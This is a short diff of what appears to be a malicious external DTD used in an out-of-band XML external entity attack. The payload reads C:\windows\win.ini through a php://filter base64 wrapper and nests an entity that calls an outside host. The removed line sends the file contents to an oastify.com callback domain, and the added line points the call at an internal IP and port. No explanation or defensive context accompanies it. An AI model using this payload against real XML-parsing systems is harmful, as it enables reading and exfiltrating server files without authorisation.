@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=C:\windows\win.ini">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://4w1q0m6ifrw66a4ki326shfio9u1ir6g.oastify.com/?%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://10.13.37.6:1337/a.txt'>">
 %eval;
 %exfil;
